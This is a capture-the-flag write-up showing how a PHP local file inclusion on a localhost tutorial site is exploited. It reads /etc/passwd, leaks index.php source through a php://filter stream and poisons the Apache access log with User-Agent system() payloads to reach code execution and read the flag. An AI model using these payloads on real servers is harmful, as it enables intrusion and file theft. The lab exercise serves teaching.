# One Does Not Simple PHP Include Writeup

Looking about the pages, it is a website on how to use Brainf*ck, but one thing to notice is the url when going to a page:
```txt
http://127.0.0.1/?page=about.php
```

this `?page=about.php` part suggests that the page may be open to LFI (Local File Inclusion), this works with the challenge name mentioning `PHP Include`.

We can confirm this in our attempt:
```html
$ curl localhost/?page=/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
<br />
<b>Warning</b>:  Undefined variable $data in <b>/var/www/html/index.php</b> on line <b>44</b><br />
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Brainf*ck 101</title>
        <meta name="viewport" contents="width=device-width, inital-scale=1.0">
        <link rel="stylesheet" href="style.css">
    </head>
<nav>
    <a href="?page=home.php">Home</a>
    <a href="?page=about.php">About</a>
    <a href="?page=learn.php">Learn</a>
    <a href="?page=contact.php">Contact</a>
</nav>
<h2>Welcome to Brainf*ck 101</h2><br>
<footer>
    Happy Brainf*cking!
</footer>
```

As you can see this resulted in the contents of the `/etc/passwd` file being printed at the top, confirming our suspicion of LFI.

The next thing to do to gather information is to get an error thrown to confirm any knowledge, we can do this by providing a file that does not exist:
```html
$ curl localhost/?page=a
<br />
<b>Warning</b>:  include(a): Failed to open stream: No such file or directory in <b>/var/www/html/index.php</b> on line <b>20</b><br />
<br />
<b>Warning</b>:  include(): Failed opening 'a' for inclusion (include_path='.:/usr/local/lib/php') in <b>/var/www/html/index.php</b> on line <b>20</b><br />
<br />
<b>Warning</b>:  Undefined variable $data in <b>/var/www/html/index.php</b> on line <b>44</b><br />
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Brainf*ck 101</title>
        <meta name="viewport" contents="width=device-width, inital-scale=1.0">
        <link rel="stylesheet" href="style.css">
    </head>
<nav>
    <a href="?page=home.php">Home</a>
    <a href="?page=about.php">About</a>
    <a href="?page=learn.php">Learn</a>
    <a href="?page=contact.php">Contact</a>
</nav>
<h2>Welcome to Brainf*ck 101</h2><br>
<footer>
    Happy Brainf*cking!
</footer>
```

This reveals that the webpage uses PHP and that the file calling include is `index.php` which is the industry standard name.
So the next step is to obviously see if we can get the `index.php` file
```html
$ curl localhost/?page=index.php
<br />
<b>Fatal error</b>:  Cannot redeclare is_allowed() (previously declared in /var/www/html/index.php:3) in <b>/var/www/html/index.php</b> on line <b>3</b><br />
```

This is an error saying that becuase `index.php` already had a function in is called `is_allowed`, when we include `index.php`, this function gets redeclared which throws an error. So we need a way to include the text from `index.php` without executing it.

A way to do this is to encode the file, the easiest way is through base64 where we can use php stream filters to encode the data
```html
$ curl localhost/?page=php://filter/convert.base64-encode/resource=index.php
PD9waHAKLy8gbWFrZSBzdXJlIHRvIHNhbml0aXNlCmZ1bmN0aW9uIGlzX2FsbG93ZWQoJHZhbHVlKQp7CiAgICAvLyBUaGUgdXNlcnMgY2FuJ3QgYmUgYWxsb3dlZCB0byBhY2Nlc3MgdGhlICcvZmxhZy50eHQnIGZpbGUsIG9yIGRvIHBhdGggdHJhdmVyc2FsCiAgICBmb3JlYWNoIChbIi4uIiwgImZsYWciXSBhcyAkdGVybSkgewogICAgICAgIGlmIChzdHJpcG9zKCR2YWx1ZSwgJHRlcm0pICE9PSBmYWxzZSkgewogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgfQogICAgcmV0dXJuIHRydWU7Cn0KCmlmIChpc3NldCgkX0dFVFsicGFnZSJdKSkgewogICAgJGZpbGUgPSAkX0dFVFsicGFnZSJdOwp9IGVsc2UgewogICAgJGZpbGUgPSAiIjsKfQoKaWYgKGlzX2FsbG93ZWQoJGZpbGUpIGFuZCAkZmlsZSAhPSAiIikgewogICAgaW5jbHVkZSAkZmlsZTsKfSBlbHNlIHsKICAgIC8vIEhhdmUgYSBkZWZhdWx0IHBhZ2UKICAgIGluY2x1ZGUgImhvbWUucGhwIjsKfQoKJGNvbnRlbnQgPSA8PDxIVE1MCjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+CiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICAgICAgPHRpdGxlPkJyYWluZipjayAxMDE8L3RpdGxlPgogICAgICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50cz0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0YWwtc2NhbGU9MS4wIj4KICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9InN0eWxlLmNzcyI+CiAgICA8L2hlYWQ+CjxuYXY+CiAgICA8YSBocmVmPSI/cGFnZT1ob21lLnBocCI+SG9tZTwvYT4KICAgIDxhIGhyZWY9Ij9wYWdlPWFib3V0LnBocCI+QWJvdXQ8L2E+CiAgICA8YSBocmVmPSI/cGFnZT1sZWFybi5waHAiPkxlYXJuPC9hPgogICAgPGEgaHJlZj0iP3BhZ2U9Y29udGFjdC5waHAiPkNvbnRhY3Q8L2E+CjwvbmF2Pgo8aDI+V2VsY29tZSB0byBCcmFpbmYqY2sgMTAxPC9oMj4KSFRNTDsKCiRjb250ZW50IC49ICRkYXRhOwoKJGNvbnRlbnQgLj0gPDw8SFRNTAo8YnI+Cjxmb290ZXI+CiAgICBIYXBweSBCcmFpbmYqY2tpbmchCjwvZm9vdGVyPgpIVE1MOwoKZWNobyAkY29udGVudDsKPz4K<br />
<b>Warning</b>:  Undefined variable $data in <b>/var/www/html/index.php</b> on line <b>45</b><br />
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Brainf*ck 101</title>
        <meta name="viewport" contents="width=device-width, inital-scale=1.0">
        <link rel="stylesheet" href="style.css">
    </head>
<nav>
    <a href="?page=home.php">Home</a>
    <a href="?page=about.php">About</a>
    <a href="?page=learn.php">Learn</a>
    <a href="?page=contact.php">Contact</a>
</nav>
<h2>Welcome to Brainf*ck 101</h2><br>
<footer>
    Happy Brainf*cking!
</footer>
```

we can then base64 decode the file to get its contents:
```php
<?php
// make sure to sanitise
function is_allowed($value)
{
    // The users can't be allowed to access the '/flag.txt' file, or do path traversal
    foreach (["..", "flag"] as $term) {
        if (stripos($value, $term) !== false) {
            return false;
        }
    }
    return true;
}

if (isset($_GET["page"])) {
    $file = $_GET["page"];
} else {
    $file = "";
}

if (is_allowed($file) and $file != "") {
    include $file;
} else {
    // Have a default page
    include "home.php";
}

$content = <<<HTML
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Brainf*ck 101</title>
        <meta name="viewport" contents="width=device-width, inital-scale=1.0">
        <link rel="stylesheet" href="style.css">
    </head>
<nav>
    <a href="?page=home.php">Home</a>
    <a href="?page=about.php">About</a>
    <a href="?page=learn.php">Learn</a>
    <a href="?page=contact.php">Contact</a>
</nav>
<h2>Welcome to Brainf*ck 101</h2>
HTML;

$content .= $data;

$content .= <<<HTML
<br>
<footer>
    Happy Brainf*cking!
</footer>
HTML;

echo $content;
?>
```

This reveals a few things, first it reveals that the flag is in a file called `flag.txt` in the root directory, and that there is no way to include the flag file through the LFI vulnerability, unless we can get some other form of file reading.

One common way to get RCE (remote code execution) is to see if we can inject php code into the logs and then read those logs.

There are two common log files in php servers, `/var/log/apache2/access.log` and `/var/log/nginx/access.log` depending on the stack used to host the server. If neither of these exist the other option is to see if there is a custom logging file specified in the php configuration file `/etc/php.ini`

```bash
$ curl localhost/?page=/var/log/nginx/access.log
<br />
<b>Warning</b>:  include(/var/log/nginx/access.log): Failed to open stream: No such file or directory in <b>/var/www/html/index.php</b> on line <b>21</b><br />
<br />
<b>Warning</b>:  include(): Failed opening '/var/log/nginx/access.log' for inclusion (include_path='.:/usr/local/lib/php') in <b>/var/www/html/index.php</b> on line <b>21</b><br />
<br />
<b>Warning</b>:  Undefined variable $data in <b>/var/www/html/index.php</b> on line <b>45</b><br />
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Brainf*ck 101</title>
        <meta name="viewport" contents="width=device-width, inital-scale=1.0">
        <link rel="stylesheet" href="style.css">
    </head>
<nav>
    <a href="?page=home.php">Home</a>
    <a href="?page=about.php">About</a>
    <a href="?page=learn.php">Learn</a>
    <a href="?page=contact.php">Contact</a>
</nav>
<h2>Welcome to Brainf*ck 101</h2><br>
<footer>
    Happy Brainf*cking!
</footer>

$ curl localhost/?page=/var/log/apache2/access.log
172.17.0.1 - - [11/Jan/2026:13:21:08 +0000] "GET / HTTP/1.1" 200 709 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0"
172.17.0.1 - - [11/Jan/2026:13:21:08 +0000] "GET /style.css HTTP/1.1" 200 1030 "http://127.0.0.1/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0"
172.17.0.1 - - [11/Jan/2026:13:21:10 +0000] "GET /?page=about.php HTTP/1.1" 200 999 "http://127.0.0.1/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0"
172.17.0.1 - - [11/Jan/2026:13:21:13 +0000] "GET /?page=/etc/passwd HTTP/1.1" 200 1652 "-" "curl/8.5.0"
172.17.0.1 - - [11/Jan/2026:13:21:17 +0000] "GET /?page=a HTTP/1.1" 200 1119 "-" "curl/8.5.0"
172.17.0.1 - - [11/Jan/2026:13:21:19 +0000] "GET /?page=index.php HTTP/1.1" 200 364 "-" "curl/8.5.0"
172.17.0.1 - - [11/Jan/2026:13:21:23 +0000] "GET /?page=php://filter/convert.base64-encode/resource=index.php HTTP/1.1" 200 2285 "-" "curl/8.5.0"
172.17.0.1 - - [11/Jan/2026:13:45:05 +0000] "GET /?page=/etc/php.ini HTTP/1.1" 200 739 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0"
172.17.0.1 - - [11/Jan/2026:13:45:05 +0000] "GET /style.css HTTP/1.1" 200 1030 "http://127.0.0.1/?page=/etc/php.ini" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0"
172.17.0.1 - - [11/Jan/2026:13:45:05 +0000] "GET /favicon.ico HTTP/1.1" 404 487 "http://127.0.0.1/?page=/etc/php.ini" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0"
172.17.0.1 - - [11/Jan/2026:13:47:57 +0000] "GET /?page=/var/log/nginx/access.log HTTP/1.1" 200 1167 "-" "curl/8.5.0"
<br />
<b>Warning</b>:  Undefined variable $data in <b>/var/www/html/index.php</b> on line <b>45</b><br />
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Brainf*ck 101</title>
        <meta name="viewport" contents="width=device-width, inital-scale=1.0">
        <link rel="stylesheet" href="style.css">
    </head>
<nav>
    <a href="?page=home.php">Home</a>
    <a href="?page=about.php">About</a>
    <a href="?page=learn.php">Learn</a>
    <a href="?page=contact.php">Contact</a>
</nav>
<h2>Welcome to Brainf*ck 101</h2><br>
<footer>
    Happy Brainf*cking!
</footer>
```

As can be seen there are logs at the apache2 endpoint. Next we need to inject code into them. The data shown in the logs is: 
1. the user's IP
2. The timestamp of the request
3. The Query HTTP method
4. the path 
5. the server's return code
6. the content length returned
7. the user agent of the user

Now we can only control the `path` and the `user-agent`, but the path will be sanitised by the server to be a valid HTTP query, also we can't get the flag through the `path` due to the blacklisting in the `index.php`. So we should see if we can inject code into the `User-Agent`

Now in curl we can control the user agent through a header `-H "User-Agent: value"`

So lets set it to be a test payload

```bash
$ curl localhost -H "User-Agent: <?php echo 'Hello World' ?>"

$ curl localhost/?page=/var/log/apache2/access.log
172.17.0.1 - - [11/Jan/2026:13:21:08 +0000] "GET / HTTP/1.1" 200 709 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0"
172.17.0.1 - - [11/Jan/2026:13:21:08 +0000] "GET /style.css HTTP/1.1" 200 1030 "http://127.0.0.1/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0"
172.17.0.1 - - [11/Jan/2026:13:21:10 +0000] "GET /?page=about.php HTTP/1.1" 200 999 "http://127.0.0.1/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0"
172.17.0.1 - - [11/Jan/2026:13:21:13 +0000] "GET /?page=/etc/passwd HTTP/1.1" 200 1652 "-" "curl/8.5.0"
172.17.0.1 - - [11/Jan/2026:13:21:17 +0000] "GET /?page=a HTTP/1.1" 200 1119 "-" "curl/8.5.0"
172.17.0.1 - - [11/Jan/2026:13:21:19 +0000] "GET /?page=index.php HTTP/1.1" 200 364 "-" "curl/8.5.0"
172.17.0.1 - - [11/Jan/2026:13:21:23 +0000] "GET /?page=php://filter/convert.base64-encode/resource=index.php HTTP/1.1" 200 2285 "-" "curl/8.5.0"
172.17.0.1 - - [11/Jan/2026:13:45:05 +0000] "GET /?page=/etc/php.ini HTTP/1.1" 200 739 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0"
172.17.0.1 - - [11/Jan/2026:13:45:05 +0000] "GET /style.css HTTP/1.1" 200 1030 "http://127.0.0.1/?page=/etc/php.ini" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0"
172.17.0.1 - - [11/Jan/2026:13:45:05 +0000] "GET /favicon.ico HTTP/1.1" 404 487 "http://127.0.0.1/?page=/etc/php.ini" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0"
172.17.0.1 - - [11/Jan/2026:13:47:57 +0000] "GET /?page=/var/log/nginx/access.log HTTP/1.1" 200 1167 "-" "curl/8.5.0"
172.17.0.1 - - [11/Jan/2026:13:48:05 +0000] "GET /?page=/var/log/apache2/access.log HTTP/1.1" 200 2464 "-" "curl/8.5.0"
172.17.0.1 - - [11/Jan/2026:13:53:52 +0000] "GET / HTTP/1.1" 200 1001 "-" "Hello World"
<br />
<b>Warning</b>:  Undefined variable $data in <b>/var/www/html/index.php</b> on line <b>45</b><br />
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Brainf*ck 101</title>
        <meta name="viewport" contents="width=device-width, inital-scale=1.0">
        <link rel="stylesheet" href="style.css">
    </head>
<nav>
    <a href="?page=home.php">Home</a>
    <a href="?page=about.php">About</a>
    <a href="?page=learn.php">Learn</a>
    <a href="?page=contact.php">Contact</a>
</nav>
<h2>Welcome to Brainf*ck 101</h2><br>
<footer>
    Happy Brainf*cking!
</footer>
```

At the end of the logs we can see that the php code was executed and the user agent is `Hello World` instead of being the payload. Now let's see if we can do RCE through this.

```bash
$ curl localhost -H "User-Agent: <?php system('ls') ?>"

$ curl localhost/?page=/var/log/apache2/access.log
172.17.0.1 - - [11/Jan/2026:13:21:08 +0000] "GET / HTTP/1.1" 200 709 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0"
172.17.0.1 - - [11/Jan/2026:13:21:08 +0000] "GET /style.css HTTP/1.1" 200 1030 "http://127.0.0.1/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0"
172.17.0.1 - - [11/Jan/2026:13:21:10 +0000] "GET /?page=about.php HTTP/1.1" 200 999 "http://127.0.0.1/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0"
172.17.0.1 - - [11/Jan/2026:13:21:13 +0000] "GET /?page=/etc/passwd HTTP/1.1" 200 1652 "-" "curl/8.5.0"
172.17.0.1 - - [11/Jan/2026:13:21:17 +0000] "GET /?page=a HTTP/1.1" 200 1119 "-" "curl/8.5.0"
172.17.0.1 - - [11/Jan/2026:13:21:19 +0000] "GET /?page=index.php HTTP/1.1" 200 364 "-" "curl/8.5.0"
172.17.0.1 - - [11/Jan/2026:13:21:23 +0000] "GET /?page=php://filter/convert.base64-encode/resource=index.php HTTP/1.1" 200 2285 "-" "curl/8.5.0"
172.17.0.1 - - [11/Jan/2026:13:45:05 +0000] "GET /?page=/etc/php.ini HTTP/1.1" 200 739 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0"
172.17.0.1 - - [11/Jan/2026:13:45:05 +0000] "GET /style.css HTTP/1.1" 200 1030 "http://127.0.0.1/?page=/etc/php.ini" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0"
172.17.0.1 - - [11/Jan/2026:13:45:05 +0000] "GET /favicon.ico HTTP/1.1" 404 487 "http://127.0.0.1/?page=/etc/php.ini" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0"
172.17.0.1 - - [11/Jan/2026:13:47:57 +0000] "GET /?page=/var/log/nginx/access.log HTTP/1.1" 200 1167 "-" "curl/8.5.0"
172.17.0.1 - - [11/Jan/2026:13:48:05 +0000] "GET /?page=/var/log/apache2/access.log HTTP/1.1" 200 2464 "-" "curl/8.5.0"
172.17.0.1 - - [11/Jan/2026:13:53:52 +0000] "GET / HTTP/1.1" 200 1001 "-" "Hello World"
172.17.0.1 - - [11/Jan/2026:13:54:14 +0000] "GET /?page=/var/log/apache2/access.log HTTP/1.1" 200 2672 "-" "curl/8.5.0"
172.17.0.1 - - [11/Jan/2026:13:55:41 +0000] "GET / HTTP/1.1" 200 1001 "-" "about.php
contact.php
home.php
index.php
learn.php
style.css
"
<br />
<b>Warning</b>:  Undefined variable $data in <b>/var/www/html/index.php</b> on line <b>45</b><br />
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Brainf*ck 101</title>
        <meta name="viewport" contents="width=device-width, inital-scale=1.0">
        <link rel="stylesheet" href="style.css">
    </head>
<nav>
    <a href="?page=home.php">Home</a>
    <a href="?page=about.php">About</a>
    <a href="?page=learn.php">Learn</a>
    <a href="?page=contact.php">Contact</a>
</nav>
<h2>Welcome to Brainf*ck 101</h2><br>
<footer>
    Happy Brainf*cking!
</footer>
```

And as can be seen we achieved RCE and got a list of all files in the directory, and because this input was through the `User-Agent` adding data to the logs which then gets executed at LFI time, we have bypassed the blacklist from `index.php`. So let's get the flag now

```bash
$ curl localhost -H "User-Agent: <?php system('cat /flag.txt') ?>"


$ curl localhost/?page=/var/log/apache2/access.log
172.17.0.1 - - [11/Jan/2026:13:21:08 +0000] "GET / HTTP/1.1" 200 709 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0"
172.17.0.1 - - [11/Jan/2026:13:21:08 +0000] "GET /style.css HTTP/1.1" 200 1030 "http://127.0.0.1/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0"
172.17.0.1 - - [11/Jan/2026:13:21:10 +0000] "GET /?page=about.php HTTP/1.1" 200 999 "http://127.0.0.1/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0"
172.17.0.1 - - [11/Jan/2026:13:21:13 +0000] "GET /?page=/etc/passwd HTTP/1.1" 200 1652 "-" "curl/8.5.0"
172.17.0.1 - - [11/Jan/2026:13:21:17 +0000] "GET /?page=a HTTP/1.1" 200 1119 "-" "curl/8.5.0"
172.17.0.1 - - [11/Jan/2026:13:21:19 +0000] "GET /?page=index.php HTTP/1.1" 200 364 "-" "curl/8.5.0"
172.17.0.1 - - [11/Jan/2026:13:21:23 +0000] "GET /?page=php://filter/convert.base64-encode/resource=index.php HTTP/1.1" 200 2285 "-" "curl/8.5.0"
172.17.0.1 - - [11/Jan/2026:13:45:05 +0000] "GET /?page=/etc/php.ini HTTP/1.1" 200 739 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0"
172.17.0.1 - - [11/Jan/2026:13:45:05 +0000] "GET /style.css HTTP/1.1" 200 1030 "http://127.0.0.1/?page=/etc/php.ini" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0"
172.17.0.1 - - [11/Jan/2026:13:45:05 +0000] "GET /favicon.ico HTTP/1.1" 404 487 "http://127.0.0.1/?page=/etc/php.ini" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0"
172.17.0.1 - - [11/Jan/2026:13:47:57 +0000] "GET /?page=/var/log/nginx/access.log HTTP/1.1" 200 1167 "-" "curl/8.5.0"
172.17.0.1 - - [11/Jan/2026:13:48:05 +0000] "GET /?page=/var/log/apache2/access.log HTTP/1.1" 200 2464 "-" "curl/8.5.0"
172.17.0.1 - - [11/Jan/2026:13:53:52 +0000] "GET / HTTP/1.1" 200 1001 "-" "Hello World"
172.17.0.1 - - [11/Jan/2026:13:54:14 +0000] "GET /?page=/var/log/apache2/access.log HTTP/1.1" 200 2672 "-" "curl/8.5.0"
172.17.0.1 - - [11/Jan/2026:13:55:41 +0000] "GET / HTTP/1.1" 200 1001 "-" "about.php
contact.php
home.php
index.php
learn.php
style.css
"
172.17.0.1 - - [11/Jan/2026:13:55:43 +0000] "GET /?page=/var/log/apache2/access.log HTTP/1.1" 200 2980 "-" "curl/8.5.0"
172.17.0.1 - - [11/Jan/2026:13:58:37 +0000] "GET / HTTP/1.1" 200 1001 "-" "redroomctf{Wh4t_d0_yu0_m34n_1t5_n0t_th4t_k1nd_0f_1nclu510n}
"
<br />
<b>Warning</b>:  Undefined variable $data in <b>/var/www/html/index.php</b> on line <b>45</b><br />
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Brainf*ck 101</title>
        <meta name="viewport" contents="width=device-width, inital-scale=1.0">
        <link rel="stylesheet" href="style.css">
    </head>
<nav>
    <a href="?page=home.php">Home</a>
    <a href="?page=about.php">About</a>
    <a href="?page=learn.php">Learn</a>
    <a href="?page=contact.php">Contact</a>
</nav>
<h2>Welcome to Brainf*ck 101</h2><br>
<footer>
    Happy Brainf*cking!
</footer>
```

As can be seen in that final line of logs, the flag is 
```txt
redroomctf{Wh4t_d0_yu0_m34n_1t5_n0t_th4t_k1nd_0f_1nclu510n}
```
